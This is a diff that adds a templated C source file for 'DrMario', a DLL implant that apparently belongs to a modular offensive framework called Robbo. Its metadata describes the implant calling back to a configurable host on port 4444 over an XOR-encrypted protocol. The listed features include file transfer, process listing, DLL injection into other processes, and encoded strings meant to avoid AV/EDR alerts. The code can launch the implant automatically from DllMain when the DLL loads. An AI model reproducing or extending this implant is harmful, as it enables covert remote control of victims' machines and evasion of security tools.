@@ -1,0 +1,94 @@
+#!name##DrMario
+#!itemType##module
+#!info##A standalone DLL module that becomes active only when a process loads the DLL. Once executed, it connects to the server and operates using the Robbo TCP protocol.
+#!info## It supports sending and receiving files, with messages encrypted using an XOR key. Includes many features such as directory navigation, file and process listing,
+#!info## and DLL injection into other processes using NT functions. The help command displays all available commands.
+#!info## Most strings and function calls are encoded, preventing suspicious text strings from being easily visible.
+#!info## The DLL supports three execution methods. Using 'DllMain', DrMario starts automatically when the DLL is loaded by a process. This method does not require the injector to specify any startup function,
+#!info## but it may trigger AV/EDR alerts more easily. The 'HelloWorld' exported function can be used as a manual startup function for the injector.
+#!info## An alternative startup method uses the two exported functions 'drHello' and 'drWorld', which must be called by the injector in sequence.
+#!fileType##dll
+#!hiveType##dll
+#!lang##c
+#!readyApp##True
+#!modProcess##BUILD_CODE##COMPILE
+#!modCompiler##Basic-C
+#!inFile##Robbo2Base_C##robbo2_base.c
+#!inFile##Robbo2Base_H##robbo2_base.h
+#!inFile##Robbo2Locust_C##robbo2_locust.c
+#!inFile##Robbo2Locust_H##robbo2_locust.h
+#!inFile##Robbo2TCP_C##robbo2_tcp.c
+#!inFile##Robbo2TCP_H##robbo2_tcp.h
+#!inFile##Robbo2##robbo2.h
+#!inFile##DrMarioHelp_C##drMario_help.c
+#!inFile##DrMarioHelp_H##drMario_help.h
+#!inFile##DrMarioBase_C##drMario_base.c
+#!inFile##DrMarioBase_H##drMario_base.h
+#!inFile##DrMarioCmd_C##drMario_cmd.c
+#!inFile##DrMarioCmd_H##drMario_cmd.h
+#!Var##DRM_IP##$IP_ADDR##Host ip address.##str
+#!Var##DRM_port##4444##Host port number.##str
+#!Var##DRM_dll_main##False##Start DrMario in DllMain function. Accepts True/False##str
+#!reqMod##ChipAndDale
+
+
+{% if DRM_dll_main == "True" or DRM_dll_main == True %}
+    {% set DRM_USE_MAIN = True %}
+{% else %}
+    {% set DRM_USE_MAIN = False %}
+{% endif %}
+
+
+#include "drMario_cmd.h"
+
+
+HANDLE helloHandle;
+
+void WINAPI drHelloWorld(void) {
+
+}
+
+void WINAPI HelloWorld(void) {
+    robbo_initialize();
+    robbo_locust_initialize();
+    rtcp_initialize();
+    pDR_MARIO_COMMANDER_CONSOLE mario = drMario_build_commander(0, {{DRM_port}});
+    mario->start(mario);
+    robbo_wapi_WaitForSingleObject(mario->cmd_handle, INFINITE);
+    mario->stop(mario);
+}
+
+void WINAPI drHello(void) {
+    robbo_initialize();
+    robbo_locust_initialize();
+    rtcp_initialize();
+}
+
+void WINAPI drWorld(void) {
+    pDR_MARIO_COMMANDER_CONSOLE mario = drMario_build_commander(0, {{DRM_port}});
+    mario->start(mario);
+    robbo_wapi_WaitForSingleObject(mario->cmd_handle, INFINITE);
+    mario->stop(mario);
+}
+
+
+BOOL DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
+     switch (reason) {
+        case DLL_PROCESS_ATTACH:
+            drMario_MAIN_MODULE = hModule;
+            {% if DRM_USE_MAIN %}
+            robbo_initialize();
+            robbo_locust_initialize();
+            drMario_MAIN_MODULE = hModule;
+            robbo_wapi_NtCreateThreadEx(&helloHandle, THREAD_ALL_ACCESS, 0, robbo_wapi_GetCurrentProcess(), (LPTHREAD_START_ROUTINE)HelloWorld, NULL, 0, 0, 0, 0, 0);
+            {% endif %}
+            break;
+        case DLL_THREAD_ATTACH:
+            break;
+        case DLL_THREAD_DETACH:
+            break;
+        case DLL_PROCESS_DETACH:
+            break;
+    }
+    return TRUE;
+}
